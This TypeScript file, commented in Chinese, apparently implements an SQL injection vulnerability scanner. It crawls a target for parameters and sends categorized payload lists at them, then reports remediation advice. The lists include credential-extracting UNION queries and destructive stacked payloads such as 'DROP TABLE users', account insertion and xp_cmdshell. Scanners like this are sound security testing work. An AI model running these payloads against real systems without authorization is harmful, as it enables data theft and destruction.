/**
 * SQL注入漏洞检测器
 * 本地化程度：100%
 * 检测各种SQL注入漏洞类型
 */

import axios from 'axios';

interface SQLPayloads {
  basic: string[];
  advanced: string[];
  blind: string[];
  timeBased: string[];
  errorBased: string[];
  union: string[];
  boolean: string[];
  stacked: string[];
}

interface SQLInjectionResult {
  url: string;
  timestamp: Date;
  vulnerable: boolean;
  severity: 'low' | 'medium' | 'high' | 'critical';
  vulnerabilities: SQLVulnerability[];
  summary: {
    totalTests: number;
    vulnerableTests: number;
    payloadCategories: Record<string, number>;
  };
  recommendations: SQLRecommendation[];
}

interface SQLVulnerability {
  type: string;
  payload: string;
  parameter: string;
  method: string;
  evidence: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  impact: string;
  remediation: string;
}

interface SQLRecommendation {
  priority: 'high' | 'medium' | 'low';
  title: string;
  description: string;
  category: string;
  effort: 'low' | 'medium' | 'high';
  examples: CodeExample[];
}

interface CodeExample {
  title: string;
  language: string;
  code: string;
  explanation: string;
}

class SQLInjectionAnalyzer {
  private payloads: SQLPayloads;

  constructor() {
    // SQL注入测试载荷
    this.payloads = {
      // 基础SQL注入测试
      basic: [
        "'",
        '"',
        "')",
        "';",
        "' OR '1'='1",
        "' OR 1=1--",
        '" OR "1"="1',
        '" OR 1=1--',
        "' OR 'a'='a",
        "' OR 1=1#",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "' AND 1=0 UNION SELECT NULL, username, password FROM users--",
      ],

      // 高级SQL注入测试
      advanced: [
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT NULL,CONCAT(user,0x3a,password),NULL FROM mysql.user--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
      ],

      // 盲注测试
      blind: [
        "' AND 1=1--",
        "' AND 1=0--",
        "' AND 'a'='a--",
        "' AND 'a'='b--",
        "1' AND 1=1--",
        "1' AND 1=0--",
        "admin' AND 1=1--",
        "admin' AND 1=0--",
      ],

      // 基于时间的盲注
      timeBased: [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "' AND (SELECT SLEEP(5))--",
        "1' AND (SELECT SLEEP(5))--",
        "admin' AND (SELECT SLEEP(5))--",
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT pg_sleep(5))--",
        "1' AND (SELECT pg_sleep(5))--",
      ],

      // 基于错误的注入
      errorBased: [
        "'",
        '"',
        "')",
        "';",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' UNION SELECT (SELECT @@version)--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      ],

      // UNION注入
      union: [
        "' UNION SELECT NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT column_name FROM information_schema.columns--",
      ],

      // 布尔盲注
      boolean: [
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT LENGTH(username) FROM users WHERE id=1)>0--",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
        "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)>64--",
        "' AND (SELECT database()) LIKE 'a%'--",
        "' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) LIKE 'a%'--",
      ],

      // 堆叠查询
      stacked: [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE id=1--",
        "'; CREATE TABLE hacked(data VARCHAR(100))--",
        "'; SELECT * FROM users; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXEC('SELECT * FROM users')--",
      ],
    };
  }

  /**
   * 分析SQL注入漏洞
   */
  async analyze(
    url: string,
    options: {
      timeout?: number;
      userAgent?: string;
      followRedirects?: boolean;
      maxRedirects?: number;
      testParameters?: string[];
      testHeaders?: boolean;
      testCookies?: boolean;
      delay?: number;
    } = {}
  ): Promise<SQLInjectionResult> {
    const {
      timeout = 30000,
      userAgent = 'SQLInjectionAnalyzer/1.0',
      followRedirects = true,
      maxRedirects = 5,
      testParameters = [],
      testHeaders = true,
      testCookies = true,
      delay = 100,
    } = options;

    const vulnerabilities: SQLVulnerability[] = [];
    const timestamp = new Date();

    try {
      // 发现测试点
      const testPoints = await this.discoverTestPoints(url, {
        timeout,
        userAgent,
        followRedirects,
        maxRedirects,
        testParameters,
        testHeaders,
        testCookies,
      });

      // 测试每个测试点
      for (const testPoint of testPoints) {
        const results = await this.testSQLInjection(testPoint, delay);
        vulnerabilities.push(...results);
      }

      // 生成建议
      const recommendations = this.generateRecommendations(vulnerabilities);

      // 计算摘要
      const summary = this.generateSummary(vulnerabilities);

      return {
        url,
        timestamp,
        vulnerable: vulnerabilities.length > 0,
        severity: this.calculateOverallSeverity(vulnerabilities),
        vulnerabilities,
        summary,
        recommendations,
      };
    } catch (error) {
      throw new Error(`SQL注入分析失败: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  /**
   * 发现测试点
   */
  private async discoverTestPoints(
    url: string,
    options: {
      timeout: number;
      userAgent: string;
      followRedirects: boolean;
      maxRedirects: number;
      testParameters: string[];
      testHeaders: boolean;
      testCookies: boolean;
    }
  ): Promise<
    Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }>
  > {
    const testPoints: Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }> = [];

    try {
      // 分析URL参数
      const urlObj = new URL(url);
      const queryParams: Array<{ name: string; type: 'query'; value: string }> = [];

      urlObj.searchParams.forEach((value, name) => {
        queryParams.push({ name, type: 'query', value });
      });

      if (queryParams.length > 0) {
        testPoints.push({
          url: urlObj.origin + urlObj.pathname,
          method: 'GET',
          parameters: queryParams,
        });
      }

      // 分析表单
      const forms = await this.discoverForms(url, options);
      forms.forEach(form => {
        testPoints.push(form);
      });

      // 分析API端点
      const apiEndpoints = await this.discoverAPIEndpoints(url, options);
      apiEndpoints.forEach(endpoint => {
        testPoints.push(endpoint);
      });

      return testPoints;
    } catch (error) {
      console.error('发现测试点失败:', error);
      return [];
    }
  }

  /**
   * 发现表单
   */
  private async discoverForms(
    url: string,
    options: {
      timeout: number;
      userAgent: string;
      followRedirects: boolean;
      maxRedirects: number;
    }
  ): Promise<
    Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }>
  > {
    try {
      const response = await axios.get(url, {
        timeout: options.timeout,
        headers: {
          'User-Agent': options.userAgent,
        },
        maxRedirects: options.maxRedirects,
      });

      const html = response.data;
      const forms: Array<{
        url: string;
        method: string;
        parameters: Array<{
          name: string;
          type: 'query' | 'form' | 'header' | 'cookie';
          value: string;
        }>;
      }> = [];

      // 简化的表单解析
      const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/gi;
      const inputRegex = /<input[^>]*name\s*=\s*["']([^"']*)["'][^>]*>/gi;

      let formMatch;
      while ((formMatch = formRegex.exec(html)) !== null) {
        const formHtml = formMatch[0];
        const methodMatch = formHtml.match(/method\s*=\s*["']([^"']*)["']/i);
        const actionMatch = formHtml.match(/action\s*=\s*["']([^"']*)["']/i);

        const method = methodMatch ? methodMatch[1].toUpperCase() : 'GET';
        const action = actionMatch ? actionMatch[1] : url;

        const formUrl = new URL(action, url).toString();
        const parameters: Array<{ name: string; type: 'form'; value: string }> = [];

        let inputMatch;
        while ((inputMatch = inputRegex.exec(formHtml)) !== null) {
          parameters.push({
            name: inputMatch[1],
            type: 'form',
            value: 'test',
          });
        }

        if (parameters.length > 0) {
          forms.push({
            url: formUrl,
            method,
            parameters,
          });
        }
      }

      return forms;
    } catch (error) {
      console.error('发现表单失败:', error);
      return [];
    }
  }

  /**
   * 发现API端点
   */
  private async discoverAPIEndpoints(
    url: string,
    options: {
      timeout: number;
      userAgent: string;
      followRedirects: boolean;
      maxRedirects: number;
    }
  ): Promise<
    Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }>
  > {
    const commonEndpoints = [
      '/api/login',
      '/api/auth',
      '/api/users',
      '/api/search',
      '/api/data',
      '/login',
      '/auth',
      '/search',
      '/data',
    ];

    const endpoints: Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }> = [];

    for (const endpoint of commonEndpoints) {
      const testUrl = new URL(endpoint, url).toString();

      // 测试GET端点
      endpoints.push({
        url: testUrl,
        method: 'GET',
        parameters: [
          { name: 'id', type: 'query', value: '1' },
          { name: 'search', type: 'query', value: 'test' },
        ],
      });

      // 测试POST端点
      endpoints.push({
        url: testUrl,
        method: 'POST',
        parameters: [
          { name: 'username', type: 'form', value: 'test' },
          { name: 'password', type: 'form', value: 'test' },
        ],
      });
    }

    return endpoints;
  }

  /**
   * 测试SQL注入
   */
  private async testSQLInjection(
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    delay: number
  ): Promise<SQLVulnerability[]> {
    const vulnerabilities: SQLVulnerability[] = [];

    for (const parameter of testPoint.parameters) {
      // 测试基础SQL注入
      const basicResults = await this.testBasicSQLInjection(testPoint, parameter, delay);
      vulnerabilities.push(...basicResults);

      // 测试高级SQL注入
      const advancedResults = await this.testAdvancedSQLInjection(testPoint, parameter, delay);
      vulnerabilities.push(...advancedResults);

      // 测试盲注
      const blindResults = await this.testBlindSQLInjection(testPoint, parameter, delay);
      vulnerabilities.push(...blindResults);

      // 测试基于时间的注入
      const timeBasedResults = await this.testTimeBasedSQLInjection(testPoint, parameter, delay);
      vulnerabilities.push(...timeBasedResults);
    }

    return vulnerabilities;
  }

  /**
   * 测试基础SQL注入
   */
  private async testBasicSQLInjection(
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    delay: number
  ): Promise<SQLVulnerability[]> {
    const vulnerabilities: SQLVulnerability[] = [];

    for (const payload of this.payloads.basic) {
      try {
        const response = await this.sendRequest(testPoint, parameter, payload);

        if (this.isSQLInjectionResponse(response, payload)) {
          vulnerabilities.push({
            type: 'basic',
            payload,
            parameter: parameter.name,
            method: testPoint.method,
            evidence: response.data,
            severity: 'high',
            description: '发现基础SQL注入漏洞',
            impact: '攻击者可以获取、修改或删除数据库数据',
            remediation: '使用参数化查询或预编译语句',
          });
        }
      } catch (error) {
        // 忽略单个测试的错误
      }

      // 添加延迟避免过快请求
      await this.sleep(delay);
    }

    return vulnerabilities;
  }

  /**
   * 测试高级SQL注入
   */
  private async testAdvancedSQLInjection(
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    delay: number
  ): Promise<SQLVulnerability[]> {
    const vulnerabilities: SQLVulnerability[] = [];

    for (const payload of this.payloads.advanced) {
      try {
        const response = await this.sendRequest(testPoint, parameter, payload);

        if (this.isSQLInjectionResponse(response, payload)) {
          vulnerabilities.push({
            type: 'advanced',
            payload,
            parameter: parameter.name,
            method: testPoint.method,
            evidence: response.data,
            severity: 'critical',
            description: '发现高级SQL注入漏洞',
            impact: '攻击者可以完全控制数据库',
            remediation: '使用参数化查询，限制数据库权限',
          });
        }
      } catch (error) {
        // 忽略单个测试的错误
      }

      await this.sleep(delay);
    }

    return vulnerabilities;
  }

  /**
   * 测试盲注
   */
  private async testBlindSQLInjection(
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    delay: number
  ): Promise<SQLVulnerability[]> {
    const vulnerabilities: SQLVulnerability[] = [];

    for (const payload of this.payloads.blind) {
      try {
        const trueResponse = await this.sendRequest(testPoint, parameter, payload);
        const falseResponse = await this.sendRequest(
          testPoint,
          parameter,
          payload.replace('1=1', '1=0')
        );

        if (this.isBlindSQLInjection(trueResponse, falseResponse)) {
          vulnerabilities.push({
            type: 'blind',
            payload,
            parameter: parameter.name,
            method: testPoint.method,
            evidence: '响应差异表明存在盲注',
            severity: 'medium',
            description: '发现盲注漏洞',
            impact: '攻击者可以逐个字符获取数据库信息',
            remediation: '使用参数化查询，统一错误处理',
          });
        }
      } catch (error) {
        // 忽略单个测试的错误
      }

      await this.sleep(delay);
    }

    return vulnerabilities;
  }

  /**
   * 测试基于时间的SQL注入
   */
  private async testTimeBasedSQLInjection(
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    delay: number
  ): Promise<SQLVulnerability[]> {
    const vulnerabilities: SQLVulnerability[] = [];

    for (const payload of this.payloads.timeBased) {
      try {
        const startTime = Date.now();
        await this.sendRequest(testPoint, parameter, payload);
        const endTime = Date.now();
        const responseTime = endTime - startTime;

        if (responseTime > 4000) {
          // 超过4秒认为存在时间注入
          vulnerabilities.push({
            type: 'time-based',
            payload,
            parameter: parameter.name,
            method: testPoint.method,
            evidence: `响应时间: ${responseTime}ms`,
            severity: 'high',
            description: '发现基于时间的SQL注入漏洞',
            impact: '攻击者可以通过时间延迟获取数据库信息',
            remediation: '使用参数化查询，限制查询执行时间',
          });
        }
      } catch (error) {
        // 忽略单个测试的错误
      }

      await this.sleep(delay);
    }

    return vulnerabilities;
  }

  /**
   * 发送请求
   */
  private async sendRequest(
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    payload: string
  ): Promise<any> {
    const config: any = {
      timeout: 10000,
      validateStatus: () => true,
    };

    // 准备请求参数
    const params: any = {};
    const data: any = {};
    const headers: any = {};

    testPoint.parameters.forEach(param => {
      if (param.name === parameter.name) {
        const value = payload;

        switch (param.type) {
          case 'query':
            params[param.name] = value;
            break;
          case 'form':
            data[param.name] = value;
            break;
          case 'header':
            headers[param.name] = value;
            break;
          case 'cookie':
            headers['Cookie'] = `${param.name}=${value}`;
            break;
        }
      } else {
        switch (param.type) {
          case 'query':
            params[param.name] = param.value;
            break;
          case 'form':
            data[param.name] = param.value;
            break;
          case 'header':
            headers[param.name] = param.value;
            break;
        }
      }
    });

    if (testPoint.method === 'GET') {
      config.params = params;
    } else {
      config.data = data;
    }

    config.headers = headers;

    return axios({
      method: testPoint.method,
      url: testPoint.url,
      ...config,
    });
  }

  /**
   * 判断是否为SQL注入响应
   */
  private isSQLInjectionResponse(response: any, payload: string): boolean {
    const responseData = response.data;
    const responseText =
      typeof responseData === 'string' ? responseData : JSON.stringify(responseData);

    // SQL错误特征
    const sqlErrors = [
      'SQL syntax',
      'mysql_fetch',
      'ORA-',
      'Microsoft OLE DB',
      'Warning: mysql',
      'SQLSTATE',
      'PostgreSQL query failed',
      'SQLiteException',
      'SQLServer JDBC Driver',
      'You have an error in your SQL syntax',
      'Unclosed quotation mark',
      'Incorrect syntax near',
      'Invalid column name',
      'Operand should contain',
      'Conversion failed',
      'Syntax error in query',
    ];

    // 检查SQL错误
    for (const error of sqlErrors) {
      if (responseText.includes(error)) {
        return true;
      }
    }

    // 检查UNION注入成功特征
    if (payload.includes('UNION') && responseText.includes('NULL')) {
      return true;
    }

    // 检查注释绕过成功特征
    if (payload.includes('--') || payload.includes('#')) {
      // 检查是否绕过了验证
      const normalResponse = responseText;
      if (normalResponse.length > 0 && !normalResponse.includes('error')) {
        return true;
      }
    }

    return false;
  }

  /**
   * 判断是否为盲注
   */
  private isBlindSQLInjection(trueResponse: any, falseResponse: any): boolean {
    const trueText =
      typeof trueResponse.data === 'string' ? trueResponse.data : JSON.stringify(trueResponse.data);
    const falseText =
      typeof falseResponse.data === 'string'
        ? falseResponse.data
        : JSON.stringify(falseResponse.data);

    // 检查响应差异
    if (trueText !== falseText) {
      // 检查是否为有意义的差异
      const trueLength = trueText.length;
      const falseLength = falseText.length;

      // 如果长度差异很大，可能存在盲注
      if (Math.abs(trueLength - falseLength) > 100) {
        return true;
      }

      // 检查内容差异
      const differences = this.calculateTextDifference(trueText, falseText);
      if (differences > 50) {
        return true;
      }
    }

    return false;
  }

  /**
   * 计算文本差异
   */
  private calculateTextDifference(text1: string, text2: string): number {
    const lines1 = text1.split('\n');
    const lines2 = text2.split('\n');

    let differences = 0;
    const maxLength = Math.max(lines1.length, lines2.length);

    for (let i = 0; i < maxLength; i++) {
      const line1 = lines1[i] || '';
      const line2 = lines2[i] || '';

      if (line1 !== line2) {
        differences++;
      }
    }

    return differences;
  }

  /**
   * 生成建议
   */
  private generateRecommendations(vulnerabilities: SQLVulnerability[]): SQLRecommendation[] {
    const recommendations: SQLRecommendation[] = [];

    if (vulnerabilities.length > 0) {
      recommendations.push({
        priority: 'high',
        title: '使用参数化查询',
        description: '使用预编译语句或参数化查询来防止SQL注入',
        category: 'prevention',
        effort: 'medium',
        examples: [
          {
            title: 'Node.js参数化查询',
            language: 'javascript',
            code: `// 错误的方式
const query = "SELECT * FROM users WHERE username = '" + username + "'";

// 正确的方式
const query = "SELECT * FROM users WHERE username = ?";
const result = db.query(query, [username]);`,
            explanation: '使用参数化查询而不是字符串拼接',
          },
          {
            title: 'Python参数化查询',
            language: 'python',
            code: `# 错误的方式
query = "SELECT * FROM users WHERE username = '" + username + "'"

# 正确的方式
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))`,
            explanation: '使用参数化查询防止SQL注入',
          },
        ],
      });

      recommendations.push({
        priority: 'high',
        title: '输入验证和过滤',
        description: '对所有用户输入进行严格的验证和过滤',
        category: 'validation',
        effort: 'low',
        examples: [
          {
            title: '输入验证',
            language: 'javascript',
            code: `function validateInput(input) {
  // 移除危险字符
  const cleaned = input.replace(/['"\\;]/g, '');
  
  // 长度限制
  if (cleaned.length > 100) {
    throw new Error('输入过长');
  }
  
  // 类型检查
  if (!/^[a-zA-Z0-9_]+$/.test(cleaned)) {
    throw new Error('包含非法字符');
  }
  
  return cleaned;
}`,
            explanation: '对用户输入进行多层验证',
          },
        ],
      });

      recommendations.push({
        priority: 'medium',
        title: '最小权限原则',
        description: '限制数据库用户的权限，只授予必要的权限',
        category: 'security',
        effort: 'medium',
        examples: [
          {
            title: '数据库权限配置',
            language: 'sql',
            code: `-- 创建只读用户
CREATE USER 'readonly'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON app_db.* TO 'readonly'@'localhost';

-- 创建应用用户
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';

-- 禁止危险权限
REVOKE DROP, CREATE, ALTER ON app_db.* FROM 'app_user'@'localhost';`,
            explanation: '按照最小权限原则配置数据库用户',
          },
        ],
      });
    }

    return recommendations;
  }

  /**
   * 生成摘要
   */
  private generateSummary(vulnerabilities: SQLVulnerability[]): {
    totalTests: number;
    vulnerableTests: number;
    payloadCategories: Record<string, number>;
  } {
    const payloadCategories: Record<string, number> = {};

    vulnerabilities.forEach(vuln => {
      payloadCategories[vuln.type] = (payloadCategories[vuln.type] || 0) + 1;
    });

    return {
      totalTests: Object.values(this.payloads).flat().length,
      vulnerableTests: vulnerabilities.length,
      payloadCategories,
    };
  }

  /**
   * 计算总体严重程度
   */
  private calculateOverallSeverity(
    vulnerabilities: SQLVulnerability[]
  ): 'low' | 'medium' | 'high' | 'critical' {
    if (vulnerabilities.length === 0) {
      return 'low';
    }

    const severityCounts = {
      critical: vulnerabilities.filter(v => v.severity === 'critical').length,
      high: vulnerabilities.filter(v => v.severity === 'high').length,
      medium: vulnerabilities.filter(v => v.severity === 'medium').length,
      low: vulnerabilities.filter(v => v.severity === 'low').length,
    };

    if (severityCounts.critical > 0) {
      return 'critical';
    } else if (severityCounts.high > 0) {
      return 'high';
    } else if (severityCounts.medium > 0) {
      return 'medium';
    } else {
      return 'low';
    }
  }

  /**
   * 延迟函数
   */
  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * 获取载荷配置
   */
  getPayloads(): SQLPayloads {
    return { ...this.payloads };
  }

  /**
   * 设置载荷配置
   */
  setPayloads(payloads: Partial<SQLPayloads>): void {
    this.payloads = { ...this.payloads, ...payloads };
  }

  /**
   * 导出分析报告
   */
  exportReport(result: SQLInjectionResult): string {
    return JSON.stringify(
      {
        timestamp: new Date().toISOString(),
        result,
        payloads: this.payloads,
      },
      null,
      2
    );
  }
}

export default SQLInjectionAnalyzer;
